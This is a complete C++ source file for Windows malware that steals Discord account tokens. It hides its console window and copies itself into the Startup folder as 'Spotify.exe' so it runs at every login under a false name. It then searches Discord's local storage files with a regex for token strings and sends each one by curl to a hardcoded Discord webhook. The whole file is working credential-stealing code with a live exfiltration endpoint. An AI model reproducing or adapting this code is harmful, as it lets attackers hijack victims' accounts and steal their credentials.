#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <regex>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>
namespace fs = std::filesystem;

bool send_token(std::string token) {

	char cmd[1024];


	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840401711205711883/NwJYct_xpJPrD5e6Xx9pzBARDl9JenMdVEYp69a4smbMCFHts-qXzTTu2KDstKToHZyW >nul", token.c_str());

	system(cmd);
	return true;
}

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}

int main() {
	FreeConsole();


	// Persistence

	char BUFFER[MAX_PATH];
	char command[1024];

	GetModuleFileNameA(NULL, BUFFER, MAX_PATH);
	sprintf(command, "copy \"%s\" %s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Spotify.exe", BUFFER, std::getenv("appdata"));
	system(command);


	// Finding token

	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb" };

	for (int i = 0; i < 1; i++) {
		std::string path = std::getenv("appdata") + installs[i];
		for (const auto& entry : fs::directory_iterator(path)) {
			std::ifstream t(entry.path());

			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
			std::vector<std::string> master;
			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.

			std::vector<std::string> check = findMatch(str, expression); // NightfallGT for this function
			for (int i = 0; i < check.size(); i++) {
				master.push_back(check[i]);
			}

			for (int i = 0; i < master.size(); i++) {
				send_token(master[i]);
			}

		}
	}

	// End
}
